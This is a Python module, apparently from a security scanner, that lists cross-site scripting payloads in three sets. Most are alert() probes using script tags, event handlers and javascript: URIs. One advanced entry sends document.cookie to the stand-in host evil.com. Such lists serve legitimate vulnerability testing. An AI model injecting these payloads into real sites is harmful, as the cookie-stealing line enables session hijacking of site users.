"""Пейлоады XSS: исходные наборы и порядок проверок сохранены."""

from typing import Final

SAFE_XSS_PAYLOADS: Final[list[str]] = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<iframe src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>Click</a>",
    '<form><button formaction="javascript:alert(1)">X</button></form>',
]


XSS_PAYLOADS: Final[list[str]] = [
    "<script>alert('XSS')</script>",
    "\" onmouseover=\"alert('XSS')",
    "'><img src=x onerror=alert('XSS')>",
]


ADVANCED_XSS_PAYLOADS: Final[list[str]] = [
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<svg><animate xlink:href=# onbegin=alert(1)></animate></svg>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<math><maction actiontype=statusline#x onmouseover=alert(1)>X</maction></math>",
    "<body oninput=alert(1)><input autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>X</marquee>",
]


__all__ = ["ADVANCED_XSS_PAYLOADS", "SAFE_XSS_PAYLOADS", "XSS_PAYLOADS"]
